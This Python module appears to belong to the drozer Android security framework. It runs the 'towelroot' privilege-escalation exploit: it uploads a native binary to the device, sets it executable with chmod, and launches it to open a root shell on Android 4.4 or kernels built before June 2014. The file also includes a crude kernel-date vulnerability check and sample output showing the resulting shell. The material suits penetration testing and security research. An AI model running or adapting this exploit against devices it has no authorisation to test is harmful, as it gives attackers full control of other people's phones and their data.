import os

from drozer.modules import common, Module

class TowelRoot(Module, common.BusyBox, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Obtain a root shell on devices running Android 4.4 KitKat and/or kernel build date < Jun 3 2014."
    description = """Escalate privileges to root on Android 4.4 KitKat and/or kernel build date < Jun 3 2014.

This module is based on and uses the same vulnerability and modified exploit provided in https://gist.github.com/fi01/a838dea63323c7c003cd.
"""
    examples = """
    dz> run exploit.root.towelroot
    [*] Uploading towelroot
    [*] Upload successful
    [*] chmod 770 /data/data/com.mwr.dz/towelroot
    [*] WARNING: Do not type 'exit' - rather use Control+C otherwise you will reboot the device!
    [*] Executing...hold thumbs...
     sh -i
    /system/bin/sh: can't find tty fd: No such device or address
    /system/bin/sh: warning: won't have full job control
    u0_a243@D6503:/data/data/com.mwr.dz # sh: can't find tty fd: No such device or address
    sh: warning: won't have full job control
    u0_a243@D6503:/data/data/com.mwr.dz # 
    """

    author = ["Tyrone (@mwrlabs)", "nmonkee (@nmonkee / @mwrlabs)"]
    date = "2014-07-22"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
   
    def isVulnerable(self, arguments):
        """
            Definitely invited: AT&T GS5, Verizon GS5, GS4 Active, Nexus 5
            May have some troubles at the door but invited: AT&T/Verizon Note 3
            Possibly invited: Every Android phone with a kernel build date < Jun 3 2014
           
            ref: http://forum.xda-developers.com/showthread.php?t=2783157
            ref: http://pastebin.com/A0PzPKnM
            ref: https://towelroot.com
           
            see: https://towelroot.com/modstrings.html
           
            ^^ for how me may need to modify the payload for different devices
        """
       
        """
            Tested on:
           
            $ cat /proc/version
            Linux version 3.4.0-g9eb14ba (android-build@vpbs1.mtv.corp.google.com) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Oct 22 15:43:47 PDT 2013
           
            $ getprop ro.build.version.release
            4.4
        """
        if not self.isBusyBoxInstalled():
            self.installBusyBox()

        returned = self.busyBoxExec("uname -v")

        # If kernel build date <= 2014 then potentially vulnerable
        for i in range(2000, 2015):
            if str(i) in returned:
                return 2

        return False

    def exploit(self, arguments):
        
        towelroot = os.path.join(self.workingDir(), "towelroot")

        # Remove if it is there
        self.shellExec("rm %s" % towelroot)

        # Upload the exploit
        self.stdout.write("[*] Uploading towelroot\n")
        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "towelroot", "libs", "armeabi", "towelroot"), towelroot)

        # Open shell and execute
        if length != None:
            self.stdout.write("[*] Upload successful\n")
            self.stdout.write("[*] chmod 770 %s\n" % towelroot)
            self.shellExec("chmod 770 %s" % towelroot)
            self.stdout.write("[*] WARNING: Do not type 'exit' - rather use Control+C otherwise you will reboot the device!\n")
            self.stdout.write("[*] Executing...hold thumbs...\n")
            self.shellStart(towelroot)
        else:
            self.stderr.write("[*] Could not upload file\n")